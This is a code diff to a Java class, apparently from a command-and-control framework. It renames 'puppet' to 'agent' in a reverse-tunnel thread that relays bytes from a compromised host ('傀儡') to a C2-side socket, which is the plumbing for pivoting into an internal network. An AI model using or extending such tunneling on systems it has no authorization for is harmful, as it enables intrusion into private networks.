@@ -1,7 +1,7 @@
 package org.leo.core.engine.reverse;
 
 import org.leo.core.engine.socks5.Socks5ProxyStatistics;
-import org.leo.core.puppet.capability.ComponentInvokeCapable;
+import org.leo.core.agent.capability.ComponentInvokeCapable;
 import org.slf4j.Logger;
 import org.slf4j.LoggerFactory;
 
@@ -10,7 +10,7 @@ import java.util.HashMap;
 import java.util.Map;
 
 /**
- * 从 puppet 端读数据 → 写到 C2 本地 socket（forwardHost:forwardPort）。
+ * 从 agent 端读数据 → 写到 C2 本地 socket（forwardHost:forwardPort）。
  * 即"傀儡 accept 到的内网客户端发来的字节"流向"C2 侧目标服务"。
  */
 class ReverseReadThread implements Runnable {
@@ -28,7 +28,7 @@ class ReverseReadThread implements Runnable {
     }
 
     public void run() {
-        ComponentInvokeCapable puppet = server.getPuppetNode();
+        ComponentInvokeCapable agent = server.getAgentNode();
         Socks5ProxyStatistics stats = server.getStatistics();
         long idleDelay = 50L;
         while (server.isRunning()) {
@@ -37,7 +37,7 @@ class ReverseReadThread implements Runnable {
                 Map<String, Object> params = new HashMap<String, Object>();
                 params.put("op", Integer.valueOf(ReverseTunnelServer.OP_READ));
                 params.put("connId", connId);
-                Map<String, Object> res = puppet.invokeComponent("ReverseTunnelComponent", params);
+                Map<String, Object> res = agent.invokeComponent("ReverseTunnelComponent", params);
                 Object code = res != null ? res.get("code") : null;
                 if (Integer.valueOf(200).equals(code)) {
                     byte[] data = (byte[]) res.get("data");
@@ -56,7 +56,7 @@ class ReverseReadThread implements Runnable {
                     continue;
                 }
                 if (Integer.valueOf(404).equals(code)) {
-                    logger.debug("反向隧道 puppet 侧连接关闭: connId={}", connId);
+                    logger.debug("反向隧道 agent 侧连接关闭: connId={}", connId);
                     try { localSocket.close(); } catch (Exception ignored) {}
                     break;
                 }
